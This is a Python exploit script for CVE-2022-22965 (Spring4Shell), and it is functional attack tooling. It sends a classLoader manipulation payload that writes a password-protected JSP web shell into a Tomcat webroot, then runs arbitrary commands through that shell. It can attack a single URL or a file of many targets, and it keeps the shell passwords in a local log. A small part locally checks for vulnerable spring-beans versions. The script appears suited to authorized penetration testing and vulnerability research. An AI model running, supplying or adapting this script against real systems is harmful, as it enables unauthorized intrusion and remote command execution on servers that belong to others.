import argparse
import os
import re
import sys
import time
from random import choice
from string import ascii_letters
from urllib.parse import urljoin, urlparse

import requests
import urllib3
from cryptocode import decrypt, encrypt
from packaging import version

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def Exploit(url, cmd, password, debug=False, timewait=10):
    headers = {
        "suffix": "%>//",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    data = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22{password}%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    try:
        print("\033[0;36m\n[<>] Deploying Web Shell in webroot...!\033[0m\n")

        response = requests.post(url, headers=headers, data=data,
                                 timeout=15, allow_redirects=False, verify=False)
        print(
            f"\033[0;36m[<>] Waiting for {timewait} seconds to upload the Web Shell...!\033[0m\n")
        time.sleep(int(timewait))
        webshellURL = urljoin(url, 'tomcatwar.jsp')
        response = requests.get(webshellURL, timeout=15,
                                allow_redirects=False, verify=False)

        if response.status_code == 200:
            execCmd = f'?pwd={password}&cmd=' + cmd

            print("\033[0;32m[+] Web Shell Deployed in webroot\033[0m")
            print(
                f"\033[0;36m[+] Navigate to the following URL to execute commands: {webshellURL}{execCmd}\033[0m")
            time.sleep(1)

            response = requests.get(f'{webshellURL}{execCmd}')
            print(f"\033[0;32m[+] Executed Command: {cmd}\033[0m")
            print("\n\033[0;33m"+response.text.split('//')[0]+"\033[0m")
        else:
            parsedURL = urlparse(url)
            baseURL = parsedURL.scheme + "://" + parsedURL.netloc
            webshellURL = urljoin(baseURL, 'tomcatwar.jsp')
            response = requests.get(webshellURL, timeout=15,
                                    allow_redirects=False, verify=False)

            if response.status_code == 200:
                execCmd = f'?pwd={password}&cmd=' + cmd

                print("\033[0;32m[+] Web Shell Deployed in webroot\033[0m")
                print(
                    f"\033[0;36m[+] Navigate to the following URL to execute commands: {webshellURL}{execCmd}\033[0m")

                response = requests.get(f'{webshellURL}{execCmd}')
                print(f"\033[0;32m[+] Executed Command: {cmd}\033[0m")
                print("\n\033[0;33m"+response.text.split('//')[0]+"\033[0m")
            else:
                print(
                    "\033[0;31m[-] Some error occured. Exploit Failed. Target may not be Vulnerable!\033[0m")

    except Exception as e:
        if debug:
            print("\033[0;31m[-] Some error occured. Exploit Failed...!\033[0m")
            print("\033[0;31mError: " + str(e) + "\033[0m")
        else:
            print(
                "\033[0;31m[-] Some error occured. Exploit Failed...! Use -d to print the error.\033[0m\n")
        pass


def savePassword(url, password: str):

    key = 'TGI5RioHZGBQ7Gmx2JoFvIoVfr2LinfR-_r-FkEJvN0='

    encryptedPassword = encrypt(password, key)

    if not os.path.isfile('spring4shell_log.txt'):
        with open('spring4shell_log.txt', 'w') as file:
            pass

    with open('spring4shell_log.txt', 'r') as file:
        for line in file.readlines():
            if line.split(':::')[0].find(url) != -1:
                decryptedPassword = decrypt(
                    line.split(':::')[1], key)
                return decryptedPassword

    with open('spring4shell_log.txt', 'a') as file:
        file.write(url + ":::" + str(encryptedPassword) + "\n")
        return None


def authCheck():
    getInstalledInstance = os.popen(
        'find / -name spring-beans*.jar 2>/dev/null').readlines()
    print("\n")
    if len(getInstalledInstance) > 0:
        for line in getInstalledInstance:
            versionInstalled = re.findall(
                r"spring-beans-(?:[0-9]\.[0-9]\.[0-9]+)", line)
            for i in versionInstalled:
                for j in i.split('-'):
                    try:
                        if isinstance(version.parse(j), version.Version):
                            if version.parse(j) < version.parse("5.3.18"):
                                print(
                                    "\033[0;31m[+] Vulnerable version of spring beans found in the path: " + line + "\033[0m")
                            else:
                                print(
                                    "\033[0;32m[-] No Vulnerable version of spring beans found\033[0m")
                    except Exception as e:
                        pass
    else:
        print(
            "\033[0;32m[-] No Vulnerable version of spring beans found\033[0m")


def main():
    parser = argparse.ArgumentParser(description='CVE-2022-22965 Exploit code')
    parser.add_argument(
        '-f', '--file', help='File containing URLs to exploit', required=False)
    parser.add_argument(
        '-u', '--url', help='Target URL to exploit', required=False)
    parser.add_argument(
        '-c', '--cmd', help='Command to run on target', required=False)
    parser.add_argument(
        '-d', '--debug', help='Print the Error', action="store_true", required=False)
    parser.add_argument(
        '-p', '--password', help='Password for the web shell', required=False)
    parser.add_argument('-t', '--timeout',
                        help='Timeout for the web shell to get Uploaded', required=False)
    parser.add_argument('-a', '--auth',
                        help='Run on the host to check for vulnerable installations', action="store_true", required=False)

    args = parser.parse_args()

    if len(sys.argv) < 2:
        parser.print_help()
        exit(0)
    if args.auth:
        authCheck()
        exit(0)

    if args.password:
        password = args.password
    else:
        password = ''.join([choice(ascii_letters) for i in range(0, 12)])

    temp = savePassword(args.url, password)

    if temp is not None:
        password = temp.strip()
    if not args.timeout:
        args.timeout = 10

    if args.url and args.cmd:
        Exploit(args.url, args.cmd, password, args.debug, args.timeout)
    elif args.url:
        Exploit(args.url, 'whoami', password, args.debug, args.timeout)

    if args.file:
        with open(args.file) as urls:
            for url in urls.readlines():
                url = url.strip()
                if args.cmd:
                    Exploit(url, args.cmd, password, args.debug, args.timeout)
                else:
                    Exploit(url, 'whoami', password, args.debug, args.timeout)


if __name__ == '__main__':
    main()